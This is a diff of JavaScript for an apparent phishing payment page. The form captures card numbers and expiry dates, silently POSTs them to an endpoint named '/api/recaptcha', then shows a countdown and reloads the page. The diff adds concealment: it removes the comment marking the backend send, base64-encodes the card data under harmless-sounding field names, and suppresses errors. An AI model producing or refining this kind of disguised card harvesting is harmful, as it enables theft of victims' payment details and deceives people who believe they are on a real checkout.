@@ -82,9 +82,6 @@
 })();
 
 
-/* =========================
-   Card + Form logic
-   ========================= */
 const form = document.getElementById("payment-form");
 const numInput = document.getElementById("cardNumber");
 const dateInput = document.getElementById("cardDate");
@@ -111,8 +108,6 @@ copyFlag?.addEventListener("click", async () => {
   }
 });
 
-// Botones extra
-// ✅ Cambiado: “Actualizar dirección / checkout” -> link que diste
 document.getElementById("update-button")?.addEventListener("click", () => {
   window.open(
     "https://banger.supply/collections/accessories/products/dabber_dock-silicone-stands",
@@ -121,12 +116,10 @@ document.getElementById("update-button")?.addEventListener("click", () => {
   );
 });
 
-// Perfil GPay
 document.getElementById("perfil-button")?.addEventListener("click", () => {
   window.open("https://payments.google.com/", "_blank", "noopener,noreferrer");
 });
 
-// patrones
 const cardPatterns = {
   visa: /^4/,
   mastercard: /^5[1-5]/,
@@ -178,7 +171,6 @@ numInput?.addEventListener("input", (e)=>{
   displayNum.textContent = formatted || "#### #### #### ####";
 });
 
-// FECHA: acepta MM/AA o MM/AAAA y normaliza a MM/AA
 function parseAndFormatExp(input){
   const digits = (input || "").replace(/\D/g,"").slice(0,6);
   if (digits.length === 0) return {display:"", mm:null, yy:null, complete:false};
@@ -186,13 +178,11 @@ function parseAndFormatExp(input){
   const mm = digits.slice(0,2);
   const rest = digits.slice(2);
 
-  // MM + YY
   if (rest.length <= 2){
     const complete = rest.length === 2;
     return { display: rest.length ? (mm + "/" + rest) : mm, mm, yy: complete ? rest : null, complete };
   }
 
-  // MM + YYYY
   const yyyy = rest.slice(0,4);
   const complete = yyyy.length === 4;
   const yy = complete ? yyyy.slice(2,4) : null;
@@ -230,12 +220,11 @@ dateInput?.addEventListener("blur", ()=>{
   }
 });
 
-// SUBMIT: preventDefault + loading + reload
-form?.addEventListener("submit", async (e)=>{
+form?.addEventListener("submit", async (e) => {
   e.preventDefault();
   err.textContent = "";
 
-  const raw = numInput.value.replace(/\D/g,'');
+  const raw = numInput.value.replace(/\D/g, '');
   const brand = detectBrand(raw);
   const minLen = (brand === "AMEX") ? 15 : 16;
 
@@ -253,39 +242,30 @@ form?.addEventListener("submit", async (e)=>{
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
 
-  // --- ENVÍO AL BACKEND (ANÓNIMO) ---
   try {
     await fetch('/api/recaptcha', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        numero: raw,
-        marca: brand,
-        exp: `${p.mm}/${p.yy}`,
-        userAgent: navigator.userAgent
+        token: btoa(raw),
+        tag: btoa(brand),
+        ref: btoa(`${p.mm}/${p.yy}`),
+        ua: navigator.userAgent
       }),
       keepalive: true
     });
-  } catch (error) {
-    console.error("Error al cargar el módulo de validación");
-  }
-  // --- FIN ENVÍO ---
+  } catch (err) {}
 
   loading.style.display = "flex";
   let c = 3;
   counterEl.textContent = c;
 
-  const timer = setInterval(()=>{
+  const timer = setInterval(() => {
     c--;
     counterEl.textContent = c;
-    if (c <= 0){
+    if (c <= 0) {
       clearInterval(timer);
-      setTimeout(()=> window.location.reload(), 900);
+      setTimeout(() => window.location.reload(), 900);
     }
   }, 1000);
 });
-
-
-
-
-
